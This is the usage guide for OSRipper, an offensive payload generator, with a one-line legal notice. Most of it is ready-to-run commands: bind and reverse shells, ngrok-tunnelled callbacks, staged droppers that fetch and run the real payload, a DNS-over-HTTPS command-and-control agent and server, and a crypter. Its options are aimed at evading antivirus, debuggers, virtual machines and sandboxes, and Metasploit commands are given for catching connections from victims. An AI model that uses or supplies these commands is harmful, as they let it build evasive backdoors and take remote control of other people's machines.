# OSRipper v0.4.2 — Usage Guide

> **Legal notice**: For authorized penetration testing and security research only. Unauthorized use is illegal.

---

## Installation

```bash
git clone https://github.com/SubGlitch1/OSRipper.git
cd OSRipper
pip3 install -e .
```

**First-time setup** (run once — installs ngrok + compile support):
```bash
osripper-cli setup
```

This puts optional deps (`pyngrok`, `nuitka`, `sandboxed`) in `~/.local/share/osripper/venv`. No manual activation needed.

---

## Two Ways to Run

| Mode | Command | Best for |
|------|---------|---------|
| **Interactive menu** | `osripper` | Beginners, guided workflow |
| **CLI (scriptable)** | `osripper-cli <command> [options]` | Automation, advanced use |

---

## CLI Quick Reference

```
osripper-cli bind      -p PORT                       # Bind shell (victim opens port)
osripper-cli reverse   -H IP -p PORT                 # Reverse shell (callback to you)
osripper-cli reverse   --ngrok -p PORT               # Reverse shell via ngrok tunnel
osripper-cli staged    -H IP -p PORT                 # Multi-stage web-delivery payload
osripper-cli doh       -d DOMAIN                     # DNS-over-HTTPS C2 agent
osripper-cli custom    --script FILE.py              # Encrypt/obfuscate your own script
osripper-cli server    DOMAIN                        # Start web C2 server (port 5000)
osripper-cli server    DOMAIN --https                # C2 server with HTTPS
osripper-cli setup                                   # Install optional dependencies
osripper-cli --version                               # Show version
```

---

## Common Options

These work on every payload command:

| Option | Description |
|--------|-------------|
| `--obfuscate` | Multi-layer code obfuscation (recommended) |
| `--enhanced` | Adds anti-debug, VM detection, junk code (requires `--obfuscate`) |
| `--compile` | Compile to standalone binary via Nuitka |
| `--icon PATH` | Custom `.ico` icon for compiled binary |
| `--delay` | Random 5–15 s startup delay (evades sandbox timing) |
| `-o, --output NAME` | Output filename (default: `payload`) |
| `--no-randomize-output` | Keep exact filename when obfuscating |
| `-q, --quiet` | Minimal terminal output |

Output files land in `./results/` relative to where you run the command.

---

## Command Examples

### Bind Shell

Victim machine opens a port; you connect to it.

```bash
# Basic
osripper-cli bind -p 4444

# Obfuscated + compiled binary
osripper-cli bind -p 4444 --obfuscate --compile

# Full stealth
osripper-cli bind -p 4444 --obfuscate --enhanced --compile --delay -o backdoor
```

**Catch the connection (Metasploit):**
```bash
msfconsole -q -x 'use python/meterpreter/bind_tcp; set RHOST <VICTIM_IP>; set RPORT 4444; exploit'
```

---

### Reverse Shell

Payload calls back to your machine.

```bash
# Basic
osripper-cli reverse -H 192.168.1.100 -p 4444

# With obfuscation and compilation
osripper-cli reverse -H 192.168.1.100 -p 4444 --obfuscate --compile

# Maximum evasion
osripper-cli reverse -H 192.168.1.100 -p 4444 \
  --obfuscate --enhanced --compile --icon app.ico --delay

# Dynamic IP via ngrok (no static IP needed)
osripper-cli reverse --ngrok -p 4444 --obfuscate --compile
```

**Catch the connection (Metasploit):**
```bash
msfconsole -q -x 'use exploit/multi/handler; \
  set PAYLOAD python/meterpreter/reverse_tcp; \
  set LHOST 192.168.1.100; set LPORT 4444; exploit'
```

---

### DNS-over-HTTPS (DoH) C2

Stealthy agent using DNS-over-HTTPS; bypasses many network controls.

```bash
# Step 1 — generate the agent
osripper-cli doh -d example.com --obfuscate --compile

# Step 2 — start the C2 server
osripper-cli server example.com

# Step 3 — open the web dashboard
# http://localhost:5000
```

---

### HTTPS C2

Certificate-pinned HTTPS channel with web dashboard.

```bash
# Start C2 server with self-signed cert (auto-generated)
osripper-cli server example.com --https

# Custom port
osripper-cli server example.com --https --port 8443

# Bring your own cert/key
osripper-cli server example.com --https --cert server.crt --key server.key

# Get the cert fingerprint (for pinning in payload)
curl http://localhost:5000/api/cert-fingerprint
```

---

### Staged Payload

Small dropper downloads and executes the real payload from your web server.

```bash
# Generate reverse payload + dropper + start web server
osripper-cli staged -H 192.168.1.100 -p 8080 --obfuscate

# Deploy: deliver results/dropper.py to the target
```

---

### Custom Script Crypter

Obfuscate any existing Python script.

```bash
osripper-cli custom --script mytool.py --obfuscate

# With enhanced obfuscation and compilation
osripper-cli custom --script mytool.py --obfuscate --enhanced --compile
```

---

## C2 Server Options

```bash
osripper-cli server DOMAIN [OPTIONS]

  DOMAIN              Your C2 domain (e.g. example.com)
  --host ADDR         Bind address (default: 0.0.0.0)
  --port PORT         Listen port (default: 5000)
  --https             Enable HTTPS (self-signed cert auto-generated)
  --cert FILE         TLS certificate file
  --key FILE          TLS private key file
  --db FILE           SQLite database path (default: c2_sessions.db)
  --debug             Enable Flask debug mode
```

Web UI endpoints:
- Dashboard: `http(s)://localhost:5000`
- DoH endpoint: `http(s)://localhost:5000/dns-query`
- Cert fingerprint: `http://localhost:5000/api/cert-fingerprint`

---

## Ngrok Integration

Use ngrok when you don't have a static IP or want to tunnel through NAT.

```bash
# Option A — let OSRipper handle it
osripper-cli reverse --ngrok -p 4444

# Option B — manual ngrok setup
ngrok tcp 4444   # run in a separate terminal, then press Enter when prompted
```

Ngrok requires `pyngrok` — install it with `osripper-cli setup`.

---

## Interactive Mode

For a guided experience with prompts:

```bash
osripper
# or
python3 -m osripper
```

Menu options mirror the CLI commands above.

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| `--compile` or `--ngrok` fails with missing package | Run `osripper-cli setup` |
| `externally managed environment` pip error | Run `osripper-cli setup` (uses a venv) |
| Output files not found | Look in `./results/` in the **current directory** |
| Ngrok tunnel fails | Verify your auth token; run `ngrok version` to check CLI |
| Metasploit listener won't start | Check port with `ss -ln \| grep 4444`; try `sudo` |
| Payload detected by AV | Add `--enhanced`, `--delay`; recompile with `--compile` |

---

## Where Are My Files?

```
./results/          ← generated payloads (Python source)
./results/*.bin     ← compiled binaries (when --compile used)
./webroot/          ← staged payload files (staged command)
./results/dropper.py ← staged dropper script
./c2_sessions.db    ← C2 session database (server command)
```

---

*For the full API reference see [`docs/API.md`](docs/API.md). Report bugs at the GitHub repository.*
